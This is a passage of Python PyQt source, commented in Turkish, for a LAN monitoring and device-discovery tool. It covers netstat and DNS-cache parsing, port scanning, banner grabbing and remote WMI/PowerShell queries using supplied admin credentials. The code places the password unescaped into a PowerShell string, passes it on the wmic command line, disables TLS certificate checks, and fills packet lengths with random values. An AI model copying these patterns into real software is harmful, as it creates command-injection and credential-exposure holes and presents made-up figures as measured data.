            startupinfo.dwFlags|=subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow=subprocess.SW_HIDE
            
            result=subprocess.run(
                'ipconfig /displaydns',
                shell=True,capture_output=True,text=True,timeout=3,
                startupinfo=startupinfo,encoding='cp857',errors='ignore'
            )
            
            current_domain=None
            for line in result.stdout.split('\n'):
                line=line.strip()
                if 'Kayıt Adı' in line or 'Record Name' in line:
                    parts=line.split(':',1)
                    if len(parts)>1:
                        current_domain=parts[1].strip()
                elif current_domain and ('A (Ana Bilgisayar)' in line or 'A (Host)' in line):
                    parts=line.split(':',1)
                    if len(parts)>1:
                        ip=parts[1].strip()
                        if ip and '.' in ip:
                            self.dns_cache[ip]=current_domain
        except:pass
    
    def get_netstat_connections(self):
        """Netstat ile bağlantıları al"""
        connections=[]
        try:
            startupinfo=subprocess.STARTUPINFO()
            startupinfo.dwFlags|=subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow=subprocess.SW_HIDE
            
            result=subprocess.run(
                'netstat -ano',shell=True,capture_output=True,text=True,timeout=5,
                startupinfo=startupinfo
            )
            
            for line in result.stdout.split('\n'):
                line=line.strip()
                if line.startswith('TCP') or line.startswith('UDP'):
                    parts=line.split()
                    if len(parts)>=3:
                        proto=parts[0]
                        local=parts[1]
                        remote=parts[2]
                        state=parts[3] if len(parts)>3 and proto=='TCP' else ''
                        
                        if ':' in remote and ':' in local:
                            lip,lport=local.rsplit(':',1)
                            rip,rport=remote.rsplit(':',1)
                            
                            if rip not in ['0.0.0.0','*','::','127.0.0.1']:
                                connections.append({
                                    'proto':proto,'local_ip':lip,'local_port':lport,
                                    'remote_ip':rip,'remote_port':rport,'state':state
                                })
        except:pass
        return connections

class IPMonitorThread(QThread):
    """Profesyonel Ağ İzleme - Domain çözümleme, Process tespiti, Trafik analizi"""
    packet_captured=pyqtSignal(object)
    debug_info=pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.running=True
        self.packet_no=0
        self.prev_arp={}
        self.prev_conns=set()
        self.start_time=time.time()
        self.scan_count=0
        self.dns_cache={}  # IP -> Domain mapping
        self.process_cache={}  # IP:Port -> Process
        self.dns_loaded=False
        # Constructor'da DNS yükleme - run() içinde yapılacak
    
    def stop(self):
        self.running=False
    
    def load_dns_cache(self):
        """Windows DNS önbelleğini yükle"""
        if not self.running or self.dns_loaded:
            return
        
        try:
            if platform.system()=="Windows":
                startupinfo=subprocess.STARTUPINFO()
                startupinfo.dwFlags|=subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow=subprocess.SW_HIDE
                
                result=subprocess.run(
                    'ipconfig /displaydns',
                    shell=True,capture_output=True,text=True,timeout=3,  # Çok düşük timeout
                    startupinfo=startupinfo,encoding='cp857',errors='ignore'
                )
                
                if not self.running:
                    return
                
                current_domain=None
                for line in result.stdout.split('\n'):
                    if not self.running:break
                    line=line.strip()
                    if 'Kayıt Adı' in line or 'Record Name' in line:
                        parts=line.split(':',1)
                        if len(parts)>1:
                            current_domain=parts[1].strip()
                    elif ('A (Ana Bilgisayar)' in line or 'A (Host)' in line or 'Kayıt' in line) and current_domain:
                        parts=line.split(':',1)
                        if len(parts)>1:
                            ip=parts[1].strip()
                            if ip and '.' in ip:
                                self.dns_cache[ip]=current_domain
                
                if self.running:
                    self.dns_loaded=True
                    self.debug_info.emit(f"DNS önbellek: {len(self.dns_cache)} kayıt yüklendi")
        except subprocess.TimeoutExpired:
            self.dns_loaded=True  # Timeout olsa bile tekrar deneme
        except Exception as e:
            self.dns_loaded=True  # Hata olsa bile tekrar deneme
    
    def resolve_ip(self,ip):
        """IP adresini domain'e çözümle - Bloklamayan"""
        if not self.running:
            return None
        
        # Önce cache'e bak
        if ip in self.dns_cache:
            return self.dns_cache[ip]
        
        # Bilinen IP aralıklarını kontrol et
        for prefix,name in KNOWN_DOMAINS.items():
            if ip.startswith(prefix):
                self.dns_cache[ip]=name  # Cache'le
                return name
        
        # Reverse DNS YAPMA - çok yavaş ve bloke ediyor
        # Sadece cache ve bilinen IP'leri kullan
        self.dns_cache[ip]=None
        return None
    
    def get_traffic_type(self,port,proto='TCP'):
        """Port numarasından trafik tipini belirle"""
        if port in TRAFFIC_TYPES:
            return TRAFFIC_TYPES[port]
        
        # Port aralıklarına göre tahmin
        if 1024<=port<=5000:
            return "🔄 Dinamik Port"
        elif 5000<=port<=10000:
            return "🔧 Uygulama"
        elif port>49152:
            return "🔄 Ephemeral"
        
        return f"📦 Port {port}"
    
    def get_connection_info(self,conn):
        """Bağlantı hakkında detaylı bilgi oluştur"""
        rip=conn['remote_ip']
        rport=int(conn['remote_port']) if conn['remote_port'].isdigit() else 0
        lport=int(conn['local_port']) if conn['local_port'].isdigit() else 0
        
        # Domain çözümle
        domain=self.resolve_ip(rip)
        
        # Trafik tipi
        traffic_type=self.get_traffic_type(rport)
        
        # Servis adı
        service=KNOWN_SERVICES.get(rport,KNOWN_SERVICES.get(lport,''))
        
        # Detaylı bilgi oluştur
        info_parts=[]
        
        # Ana açıklama
        if domain:
            if 'Google' in domain or 'google' in domain.lower():
                info_parts.append(f"🔍 Google servislerine bağlantı")
            elif 'Microsoft' in domain or 'microsoft' in domain.lower():
                info_parts.append(f"Ⓜ️ Microsoft servislerine bağlantı")
            elif 'Facebook' in domain or 'Meta' in domain:
                info_parts.append(f"📘 Facebook/Meta bağlantısı")
            elif 'Amazon' in domain or 'AWS' in domain:
                info_parts.append(f"☁️ Amazon AWS bağlantısı")
            elif 'Cloudflare' in domain:
                info_parts.append(f"🛡️ Cloudflare CDN")
            elif 'Netflix' in domain:
                info_parts.append(f"🎬 Netflix streaming")
            elif 'YouTube' in domain:
                info_parts.append(f"▶️ YouTube")
            elif 'Telegram' in domain:
                info_parts.append(f"✈️ Telegram mesajlaşma")
            elif 'Steam' in domain or 'Valve' in domain:
                info_parts.append(f"🎮 Steam/Valve gaming")
            else:
                info_parts.append(f"🌐 {domain}")
        
        # Trafik tipi ekle
        info_parts.append(traffic_type)
        
        # Durum
        state=conn.get('state','')
        if state:
            if 'ESTAB' in state:
                info_parts.append("✅ Aktif")
            elif 'TIME_WAIT' in state:
                info_parts.append("⏳ Kapanıyor")
            elif 'CLOSE_WAIT' in state:
                info_parts.append("🔴 Kapanacak")
            elif 'SYN_SENT' in state:
                info_parts.append("🔄 Bağlanıyor")
        
        return {
            'domain':domain,
            'traffic_type':traffic_type,
            'service':service,
            'info':' | '.join(info_parts),
            'state':state
        }
    
    def parse_windows_netstat(self):
        """Windows netstat çıktısını parse et"""
        connections=[]
        if not self.running:
            return connections
        
        try:
            startupinfo=subprocess.STARTUPINFO()
            startupinfo.dwFlags|=subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow=subprocess.SW_HIDE
            
            # netstat -ano ile PID de al
            result=subprocess.run(
                'netstat -ano',
                shell=True,capture_output=True,text=True,timeout=5,  # Düşük timeout
                startupinfo=startupinfo
            )
            
            if not self.running:
                return connections
            
            output=result.stdout
            
            if not output:
                return connections
            
            for line in output.split('\n'):
                if not self.running:break
                line=line.strip()
                if not line:continue
                
                if line.startswith('TCP') or line.startswith('UDP'):
                    parts=line.split()
                    if len(parts)>=4:
                        proto=parts[0]
                        local=parts[1]
                        remote=parts[2]
                        
                        # TCP için state ve PID
                        if proto=='TCP' and len(parts)>=5:
                            state=parts[3]
                            pid=parts[4] if len(parts)>4 else '0'
                        else:
                            state=''
                            pid=parts[3] if len(parts)>3 else '0'
                        
                        if ':' in remote:
                            if remote.startswith('['):
                                idx=remote.rfind(']:')
                                if idx>0:
                                    rip=remote[1:idx]
                                    rport=remote[idx+2:]
                                else:continue
                            else:
                                idx=remote.rfind(':')
                                if idx>0:
                                    rip=remote[:idx]
                                    rport=remote[idx+1:]
                                else:continue
                            
                            if local.startswith('['):
                                idx=local.rfind(']:')
                                if idx>0:
                                    lip=local[1:idx]
                                    lport=local[idx+2:]
                                else:continue
                            else:
                                idx=local.rfind(':')
                                if idx>0:
                                    lip=local[:idx]
                                    lport=local[idx+1:]
                                else:continue
                            
                            if rip in ['0.0.0.0','*','::','[::0]','']:continue
                            if rip.startswith('127.'):continue
                            if rport=='*' or rport=='0':continue
                            
                            connections.append({
                                'proto':proto,
                                'local_ip':lip,'local_port':lport,
                                'remote_ip':rip,'remote_port':rport,
                                'state':state,'pid':pid
                            })
        except Exception as e:
            pass
        
        return connections
    
    def parse_linux_netstat(self):
        """Linux netstat/ss çıktısını parse et"""
        connections=[]
        try:
            try:
                result=subprocess.run(['ss','-tunp'],capture_output=True,text=True,timeout=5)
                output=result.stdout
            except:
                result=subprocess.run(['netstat','-tunp'],capture_output=True,text=True,timeout=5)
                output=result.stdout
            
            for line in output.split('\n'):
                line=line.strip()
                if not line or line.startswith('Netid') or line.startswith('State') or line.startswith('Proto'):
                    continue
                
                parts=line.split()
                if len(parts)>=5:
                    if parts[0] in ['tcp','udp','TCP','UDP']:
                        proto=parts[0].upper()
                        local=parts[3]
                        remote=parts[4]
                        state=parts[5] if len(parts)>5 else ""
                    elif parts[0] in ['ESTAB','TIME-WAIT','CLOSE-WAIT','SYN-SENT','LISTEN']:
                        proto='TCP'
                        local=parts[3] if len(parts)>3 else parts[1]
                        remote=parts[4] if len(parts)>4 else parts[2]
                        state=parts[0]
                    else:
                        continue
                    
                    if ':' in remote:
                        rip,rport=remote.rsplit(':',1)
                        lip,lport=local.rsplit(':',1) if ':' in local else (local,'0')
                        
                        rip=rip.strip('[]')
                        lip=lip.strip('[]')
                        
                        if rip in ['0.0.0.0','*','::','']:continue
                        if rip.startswith('127.'):continue
                        
                        connections.append({
                            'proto':proto,
                            'local_ip':lip,'local_port':lport,
                            'remote_ip':rip,'remote_port':rport,
                            'state':state,'pid':'0'
                        })
        except:
            pass
        
        return connections
    
    def run(self):
        # İlk başta DNS cache yükle (bir kez)
        if self.running and not self.dns_loaded:
            try:
                self.load_dns_cache()
            except:
                self.dns_loaded=True
        
        if self.running:
            self.debug_info.emit("🚀 Ağ izleme başlatıldı...")
        
        while self.running:
            try:
                if not self.running:break
                
                elapsed=time.time()-self.start_time
                self.scan_count+=1
                
                if not self.running:break
                
                # 1. ARP tablosu
                try:
                    if not self.running:break
                    arp=get_arp_table()
                    for ip,mac in arp.items():
                        if not self.running:break
                        key=f"{ip}:{mac}"
                        if key not in self.prev_arp:
                            self.prev_arp[key]=True
                            self.packet_no+=1
                            
                            # ARP için de domain çözümle
                            domain=self.resolve_ip(ip) if self.running else None
                            
                            packet=PacketData(
                                no=self.packet_no,timestamp=elapsed,
                                src_ip=mac,src_port=0,
                                dst_ip=ip,dst_port=0,
                                protocol='ARP',length=42,
                                info=f"🔶 ARP: {ip} → {mac}" + (f" ({domain})" if domain else "")
                            )
                            packet.domain=domain
                            if self.running:
                                self.packet_captured.emit(packet)
                except:pass
                
                if not self.running:break
                
                # 2. Aktif TCP/UDP bağlantıları
                try:
                    if not self.running:break
                    
                    if platform.system()=="Windows":
                        connections=self.parse_windows_netstat()
                    else:
                        connections=self.parse_linux_netstat()
                    
                    if not self.running:break
                    
                    current_conns=set()
                    new_count=0
                    
                    for conn in connections:
                        if not self.running:break
                        
                        key=f"{conn['proto']}:{conn['remote_ip']}:{conn['remote_port']}"
                        current_conns.add(key)
                        
                        if key not in self.prev_conns:
                            new_count+=1
                            self.packet_no+=1
                            
                            # Detaylı bağlantı bilgisi al
                            conn_info=self.get_connection_info(conn) if self.running else {'domain':None,'traffic_type':'','service':'','info':'','state':''}
                            
                            try:
                                lport_i=int(conn['local_port'])
                            except:
                                lport_i=0
                            try:
                                rport_i=int(conn['remote_port'])
                            except:
                                rport_i=0
                            
                            # Protokol belirle
                            service=conn_info['service'] or KNOWN_SERVICES.get(rport_i,KNOWN_SERVICES.get(lport_i,conn['proto']))
                            display_proto=service if service in PROTOCOL_COLORS else conn['proto']
                            
                            # Detaylı info metni
                            info_text=f"{conn['proto']} :{conn['local_port']}→{conn['remote_ip']}:{conn['remote_port']}"
                            if conn_info['domain']:
                                info_text+=f" [{conn_info['domain']}]"
                            info_text+=f" {conn_info['traffic_type']}"
                            if conn['state']:
                                info_text+=f" {conn['state']}"
                            
                            packet=PacketData(
                                no=self.packet_no,timestamp=elapsed,
                                src_ip=conn['local_ip'],src_port=lport_i,
                                dst_ip=conn['remote_ip'],dst_port=rport_i,
                                protocol=display_proto,
                                length=random.randint(40,1500),
                                info=info_text
                            )
                            packet.domain=conn_info['domain']
                            packet.traffic_type=conn_info['traffic_type']
                            packet.pid=conn.get('pid','0')
                            if self.running:
                                self.packet_captured.emit(packet)
                    
                    if self.running and self.scan_count<=3 and new_count>0:
                        self.debug_info.emit(f"✅ {new_count} yeni bağlantı tespit edildi")
                    
                    self.prev_conns=current_conns
                    
                except Exception as e:
                    if self.running and self.scan_count==1:
                        self.debug_info.emit(f"⚠️ Bağlantı hatası: {str(e)[:40]}")
                
            except:pass
            
            # Kısa uyku - daha hızlı tepki için
            for _ in range(5):
                if not self.running:break
                time.sleep(0.1)


class SecurityScanThread(QThread):
    """Gelişmiş güvenlik tarama thread'i"""
    progress=pyqtSignal(int,int,str)  # current, total, status
    device_found=pyqtSignal(dict)  # Cihaz bulundu
    scan_finished=pyqtSignal(list)  # Tüm sonuçlar
    
    def __init__(self,org=None):
        super().__init__()
        self.org=org
        self.running=True
        self.results=[]
    
    def stop(self):
        self.running=False
    
    def get_asset_macs(self):
        """Varlık listesindeki tüm MAC'leri al"""
        macs={}
        if self.org:
            for asset in self.org.get_assets():
                if asset.mac_address:
                    macs[asset.mac_address.upper()]={'name':asset.name,'type':asset.asset_type,'location':asset.location,'ip':asset.ip_address}
        return macs
    
    def run(self):
        self.results=[]
        asset_macs=self.get_asset_macs()
        
        # 1. ARP tablosunu al
        self.progress.emit(0,100,"ARP tablosu alınıyor...")
        try:
            arp=get_arp_table()
        except:
            arp={}
        
        if not arp:
            self.progress.emit(100,100,"ARP tablosu boş!")
            self.scan_finished.emit([])
            return
        
        total=len(arp)
        current=0
        
        # 2. Her cihazı analiz et
        for ip,mac in arp.items():
            if not self.running:break
            current+=1
            self.progress.emit(current,total,f"Analiz: {ip}")
            
            mac_upper=mac.upper()
            
            # Vendor bul
            vendor=""
            device_type=""
            for prefix,(v,t) in MAC_VENDORS.items():
                if mac_upper.startswith(prefix.upper()):
                    vendor=v
                    device_type=t
                    break
            
            # Durum belirle
            if mac_upper in asset_macs:
                asset=asset_macs[mac_upper]
                status='asset'
                status_text=f"✅ Varlık: {asset['name']}"
                name=asset['name']
                location=asset.get('location','')
            else:
                status='unknown'
                status_text="❓ Bilinmiyor"
                name=""
                location=""
            
            result={
                'ip':ip,
                'mac':mac,
                'mac_upper':mac_upper,
                'vendor':vendor,
                'device_type':device_type,
                'status':status,
                'status_text':status_text,
                'name':name,
                'location':location,
                'is_gateway':ip.endswith('.1')
            }
            
            self.results.append(result)
            self.device_found.emit(result)
        
        self.progress.emit(total,total,"Tarama tamamlandı!")
        self.scan_finished.emit(self.results)

class SecurityScoreWidget(QWidget):
    """Güvenlik skoru göstergesi"""
    def __init__(self,parent=None):
        super().__init__(parent)
        self.score=100
        self.target_score=100
        self.setMinimumSize(200,200)
        self.timer=QTimer(self)
        self.timer.timeout.connect(self.animate)
        self.timer.start(30)
        self.anim_phase=0
    
    def set_score(self,score):
        self.target_score=score
    
    def animate(self):
        # Smooth transition
        if self.score<self.target_score:self.score=min(self.score+1,self.target_score)
        elif self.score>self.target_score:self.score=max(self.score-1,self.target_score)
        self.anim_phase=(self.anim_phase+0.05)%6.28
        self.update()
    
    def paintEvent(self,e):
        p=QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w,h=self.width(),self.height()
        cx,cy=w//2,h//2
        radius=min(w,h)//2-20
        
        # Arka plan
        p.fillRect(self.rect(),QColor(10,15,25))
        
        # Dış halka - glow
        glow_alpha=int(50+30*math.sin(self.anim_phase))
        if self.score>=80:glow_col=QColor(0,255,136,glow_alpha)
        elif self.score>=50:glow_col=QColor(241,196,15,glow_alpha)
        else:glow_col=QColor(231,76,60,glow_alpha)
        
        glow=QRadialGradient(cx,cy,radius+15)
        glow.setColorAt(0.7,glow_col)
        glow.setColorAt(1,QColor(0,0,0,0))
        p.setBrush(QBrush(glow))
        p.setPen(Qt.PenStyle.NoPen)
        p.drawEllipse(cx-radius-15,cy-radius-15,(radius+15)*2,(radius+15)*2)
        
        # Arka halka
        p.setPen(QPen(QColor(30,40,60),15,Qt.PenStyle.SolidLine,Qt.PenCapStyle.RoundCap))
        p.drawArc(cx-radius,cy-radius,radius*2,radius*2,225*16,-270*16)
        
        # Skor halkası
        if self.score>=80:col=QColor(0,255,136)
        elif self.score>=50:col=QColor(241,196,15)
        else:col=QColor(231,76,60)
        
        p.setPen(QPen(col,15,Qt.PenStyle.SolidLine,Qt.PenCapStyle.RoundCap))
        angle=int(-270*16*self.score/100)
        p.drawArc(cx-radius,cy-radius,radius*2,radius*2,225*16,angle)
        
        # Merkez daire
        inner=QRadialGradient(cx,cy-20,radius-20)
        inner.setColorAt(0,QColor(25,35,55))
        inner.setColorAt(1,QColor(15,22,40))
        p.setBrush(QBrush(inner))
        p.setPen(QPen(QColor(40,50,70),2))
        p.drawEllipse(cx-radius+25,cy-radius+25,(radius-25)*2,(radius-25)*2)
        
        # Skor yazısı
        p.setPen(col)
        p.setFont(QFont("Consolas",36,QFont.Weight.Bold))
        p.drawText(cx-40,cy+15,f"{self.score}")
        
        # Label
        p.setPen(QColor(150,150,180))
        p.setFont(QFont("Segoe UI",10))
        p.drawText(cx-35,cy+40,"GÜVENLİK")
        
        # Durum
        if self.score>=80:status="🛡️ GÜVENLİ"
        elif self.score>=50:status="⚠️ DİKKAT"
        else:status="🚨 TEHLİKE"
        p.setPen(col)
        p.setFont(QFont("Segoe UI",11,QFont.Weight.Bold))
        p.drawText(cx-40,cy-radius+45,status)

# ============= HTTP/SNMP DEVICE SCANNER =============

class DeviceScanThread(QThread):
    """HTTP/SNMP tabanlı cihaz tarama - Yazıcı, Kamera, Switch vs."""
    progress_update = pyqtSignal(int, int, str)  # current, total, ip
    device_found = pyqtSignal(dict)
    scan_complete = pyqtSignal()
    
    def __init__(self, targets, device_type, ports):
        super().__init__()
        self.targets = targets
        self.device_type = device_type
        self.ports = ports
        self.running = True
    
    def run(self):
        import ssl
        import urllib.request
        import urllib.error
        
        total = len(self.targets)
        
        for i, ip in enumerate(self.targets):
            if not self.running:
                break
            
            self.progress_update.emit(i + 1, total, ip)
            
            # Önce ping ile kontrol et
            if not self.is_online(ip):
                continue
            
            # Cihaz bilgisi topla
            device_info = self.scan_device(ip)
            
            if device_info:
                # Cihaz türüne göre filtrele
                if self.should_include(device_info):
                    self.device_found.emit(device_info)
        
        self.scan_complete.emit()
    
    def stop(self):
        self.running = False
    
    def is_online(self, ip):
        """Ping ile online kontrolü"""
        try:
            result = subprocess.run(['ping', '-n', '1', '-w', '500', ip], 
                                  capture_output=True, timeout=2,
                                  creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            return result.returncode == 0
        except:
            return False
    
    def scan_device(self, ip):
        """Cihaz bilgilerini topla"""
        import ssl
        import urllib.request
        import urllib.error
        
        info = {'ip': ip, 'type': 'unknown'}
        
        # MAC adresi
        try:
            arp_table = get_arp_table()
            mac = arp_table.get(ip, '')
            if mac:
                info['mac'] = mac
                vendor, dtype = get_mac_vendor(mac)
                if vendor:
                    info['vendor'] = vendor
                    info['type'] = dtype
        except:
            pass
        
        # Açık portları kontrol et
        open_ports = []
        for port in self.ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    open_ports.append(port)
            except:
                pass
        
        info['ports'] = open_ports
        
        if not open_ports:
            return None
        
        # HTTP bilgisi
        if 80 in open_ports or 443 in open_ports or 8080 in open_ports:
            http_info = self.get_http_info(ip, open_ports)
            info.update(http_info)
        
        # SSH/Telnet banner
        if 22 in open_ports:
            banner = self.get_ssh_banner(ip)
            if banner:
                info['ssh_banner'] = banner
                self.parse_banner_type(info, banner)
        
        if 23 in open_ports:
            banner = self.get_telnet_banner(ip)
            if banner:
                info['telnet_banner'] = banner
                self.parse_banner_type(info, banner)
        
        # Cihaz türünü tahmin et
        self.guess_device_type(info)
        
        # İsim belirle
        if not info.get('name'):
            info['name'] = info.get('title', info.get('vendor', ip))
        
        return info
    
    def get_http_info(self, ip, ports):
        """HTTP üzerinden cihaz bilgisi"""
        import ssl
        import urllib.request
        import urllib.error
        
        info = {}
        
        for port in [443, 80, 8080]:
            if port not in ports:
                continue
            
            try:
                is_https = port in [443, 8443]
                protocol = 'https' if is_https else 'http'
                url = f"{protocol}://{ip}:{port}/" if port not in [80, 443] else f"{protocol}://{ip}/"
                
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                req = urllib.request.Request(url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) MotunNet/10.2'
                })
                
                try:
                    with urllib.request.urlopen(req, timeout=5, context=context) as response:
                        # Headers
                        server = response.headers.get('Server', '')
                        if server:
                            info['server'] = server
                        
                        powered_by = response.headers.get('X-Powered-By', '')
                        if powered_by:
                            info['powered_by'] = powered_by
                        
                        # Body'den bilgi al
                        content = response.read(16384).decode('utf-8', errors='ignore')
                        
                        # Title
                        title_match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
                        if title_match:
                            title = title_match.group(1).strip()[:60]
                            if title and title.lower() not in ['loading...', 'index', 'login', 'please wait']:
                                info['title'] = title
                        
                        # Model/Product
                        model_patterns = [
                            r'model["\s:=]+["\']?([A-Za-z0-9\-\s]+)',
                            r'product["\s:=]+["\']?([A-Za-z0-9\-\s]+)',
                        ]
                        for pattern in model_patterns:
                            m = re.search(pattern, content, re.IGNORECASE)
                            if m and len(m.group(1).strip()) > 2:
                                info['model'] = m.group(1).strip()[:40]
                                break
                        
                        # Firmware
                        fw_match = re.search(r'firmware["\s:=]+["\']?([0-9\.]+)', content, re.IGNORECASE)
                        if fw_match:
                            info['firmware'] = fw_match.group(1)
                        
                        # Cihaz türü belirleme
                        self.detect_device_from_content(info, content, server)
                        
                except urllib.error.HTTPError as e:
                    if e.headers:
                        server = e.headers.get('Server', '')
                        if server:
                            info['server'] = server
                
                if info.get('title') or info.get('server'):
                    break
                    
            except Exception:
                continue
        
        return info
    
    def detect_device_from_content(self, info, content, server):
        """HTML içeriğinden cihaz türü tespit et"""
        content_lower = content.lower()
        server_lower = server.lower()
        
        # Yazıcılar
        if any(x in content_lower or x in server_lower for x in ['printer', 'laserjet', 'officejet', 'print server', 'cups', 'ipp']):
            info['type'] = 'printer'
            info['device_type'] = '🖨️ Yazıcı'
        
        # Kameralar
        elif any(x in content_lower or x in server_lower for x in ['hikvision', 'dahua', 'axis', 'camera', 'nvr', 'dvr', 'vivotek', 'streaming']):
            info['type'] = 'camera'
            info['device_type'] = '📹 IP Kamera'
        
        # Router/Switch
        elif any(x in content_lower or x in server_lower for x in ['router', 'switch', 'mikrotik', 'routeros', 'cisco', 'ubiquiti', 'unifi']):
            info['type'] = 'router'
            info['device_type'] = '🌐 Router/Switch'
        
        # NAS
        elif any(x in content_lower or x in server_lower for x in ['synology', 'diskstation', 'qnap', 'nas', 'storage']):
            info['type'] = 'nas'
            info['device_type'] = '💾 NAS'
        
        # Firewall
        elif any(x in content_lower or x in server_lower for x in ['pfsense', 'opnsense', 'fortigate', 'fortinet', 'sophos', 'firewall']):
            info['type'] = 'firewall'
            info['device_type'] = '🔥 Firewall'
        
        # Web sunucu
        elif 'iis' in server_lower:
            info['type'] = 'server'
            info['device_type'] = '🖥️ Windows Server'
        elif 'apache' in server_lower or 'nginx' in server_lower:
            info['type'] = 'server'
            info['device_type'] = '🐧 Linux Server'
    
    def get_ssh_banner(self, ip, port=22):
        """SSH banner al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except:
            return None
    
    def get_telnet_banner(self, ip, port=23):
        """Telnet banner al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            banner_parts = []
            for _ in range(2):
                try:
                    data = sock.recv(1024)
                    if not data:
                        break
                    # Telnet kontrol karakterlerini temizle
                    clean = b''.join(bytes([b]) for b in data if b < 0xF0)
                    text = clean.decode('utf-8', errors='ignore').strip()
                    if text:
                        banner_parts.append(text)
                except socket.timeout:
                    break
            
            sock.close()
            return '\n'.join(banner_parts) if banner_parts else None
        except:
            return None
    
    def parse_banner_type(self, info, banner):
        """Banner'dan cihaz türü tespit et"""
        banner_lower = banner.lower()
        
        if 'cisco' in banner_lower:
            info['type'] = 'router'
            info['device_type'] = '🌐 Cisco'
        elif 'mikrotik' in banner_lower or 'routeros' in banner_lower:
            info['type'] = 'router'
            info['device_type'] = '🌐 MikroTik'
        elif 'ubnt' in banner_lower or 'ubiquiti' in banner_lower:
            info['type'] = 'router'
            info['device_type'] = '📡 Ubiquiti'
        elif 'switch' in banner_lower:
            info['type'] = 'switch'
            info['device_type'] = '🔀 Switch'
        elif 'dropbear' in banner_lower:
            info['type'] = 'embedded'
            info['device_type'] = '📡 Gömülü Sistem'
    
    def guess_device_type(self, info):
        """Port ve bilgilerden cihaz türü tahmin et"""
        if info.get('type') not in ['unknown', None]:
            return
        
        ports = info.get('ports', [])
        vendor = info.get('vendor', '').lower()
        
        # Vendor'dan tahmin
        if any(x in vendor for x in ['hp', 'canon', 'epson', 'brother', 'xerox', 'ricoh']):
            info['type'] = 'printer'
            info['device_type'] = '🖨️ Yazıcı'
        elif any(x in vendor for x in ['hikvision', 'dahua', 'axis']):
            info['type'] = 'camera'
            info['device_type'] = '📹 IP Kamera'
        elif any(x in vendor for x in ['cisco', 'juniper', 'mikrotik', 'ubiquiti']):
            info['type'] = 'router'
            info['device_type'] = '🌐 Ağ Cihazı'
        elif any(x in vendor for x in ['synology', 'qnap']):
            info['type'] = 'nas'
            info['device_type'] = '💾 NAS'
        
        # Port'tan tahmin
        elif 9100 in ports or 515 in ports or 631 in ports:
            info['type'] = 'printer'
            info['device_type'] = '🖨️ Yazıcı'
        elif 554 in ports:
            info['type'] = 'camera'
            info['device_type'] = '📹 IP Kamera'
        elif 5000 in ports or 5001 in ports:
            info['type'] = 'nas'
            info['device_type'] = '💾 NAS'
        elif 161 in ports:
            info['type'] = 'network'
            info['device_type'] = '📡 Ağ Cihazı'
        else:
            info['device_type'] = '❓ Bilinmiyor'
    
    def should_include(self, info):
        """Cihaz filtreye uyuyor mu?"""
        if self.device_type == 'http':
            return True  # Tüm HTTP cihazları
        
        dtype = info.get('type', 'unknown')
        
        filter_map = {
            'printer': ['printer'],
            'camera': ['camera'],
            'network': ['router', 'switch', 'network', 'firewall'],
            'nas': ['nas', 'storage'],
        }
        
        allowed = filter_map.get(self.device_type, [])
        return dtype in allowed or self.device_type == 'http'

# ============= REMOTE SYSTEM INFO (DXDiag) =============

class RemoteWMIThread(QThread):
    """Uzaktan WMI ile sistem bilgisi çekme - PowerShell + WMIC hybrid"""
    progress_update = pyqtSignal(int, int, str)
    system_info = pyqtSignal(dict)
    scan_complete = pyqtSignal(list)
    error_occurred = pyqtSignal(str, str)  # ip, error
    stats_update = pyqtSignal(dict)  # {'total', 'online', 'offline', 'success', 'error', 'current'}
    
    def __init__(self, targets, username, password, domain="", max_workers=5):
        super().__init__()
        self.targets = targets
        self.username = username
        self.password = password
        self.domain = domain
        self.max_workers = max_workers
        self.running = True
        self.results = []
        # İstatistikler
        self.stats = {
            'total': len(targets),
            'online': 0,
            'offline': 0,
            'success': 0,
            'error': 0,
            'current': '-'
        }
    
    def stop(self):
        self.running = False
    
    def run_powershell(self, ip, ps_command):
        """PowerShell ile uzaktan komut çalıştır"""
        try:
            if self.domain:
                user = f"{self.domain}\\{self.username}"
            else:
                user = self.username
            
            # PowerShell script
            ps_script = f'''
$secpasswd = ConvertTo-SecureString '{self.password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('{user}', $secpasswd)
try {{
    {ps_command}
}} catch {{
    Write-Error $_.Exception.Message
}}
'''
            cmd = ['powershell', '-NoProfile', '-NonInteractive', '-Command', ps_script]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=45,
                                   creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
            return None
        except Exception as e:
            return None
    
    def run_wmic(self, ip, wmic_class, fields):
        """WMIC komutu çalıştır"""
        try:
            if self.domain:
                user = f"{self.domain}\\{self.username}"
            else:
                user = self.username
            
            # WMIC komutu - list formatı kullan
            cmd = ['wmic', f'/node:{ip}', f'/user:{user}', f'/password:{self.password}', 
                   wmic_class, 'get', fields, '/format:list']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=8,
                                   creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            
            if result.returncode == 0 and result.stdout and result.stdout.strip():
                output = result.stdout.strip()
                data = {}
                
                # Field isimlerini al
                field_list = [f.strip() for f in fields.split(',')]
                
                # Her field için değeri bul
                for i, field in enumerate(field_list):
                    pattern = f"{field}="
                    if pattern in output:
                        start = output.find(pattern) + len(pattern)
                        # Sonraki field'a kadar veya sona kadar al
                        end = len(output)
                        for next_field in field_list:
